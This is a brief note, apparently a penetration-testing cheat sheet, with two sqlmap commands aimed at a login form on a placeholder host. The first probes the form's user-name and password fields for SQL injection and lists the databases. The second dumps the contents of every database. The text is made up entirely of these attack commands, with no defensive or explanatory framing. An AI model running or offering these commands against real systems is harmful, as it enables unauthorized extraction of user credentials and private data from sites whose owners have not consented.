Validate whether the system is vulnerable.
```sqlmap -u "http://somehost/index.php?page=login.php" --data "user_name=u&password=p&Submit_button=Submit" --dbs```

Dump everything
```sqlmap -u "http://somehost/index.php?page=login.php" --data "user_name=u&password=p&Submit_button=Submit" --dbs --dump-all```

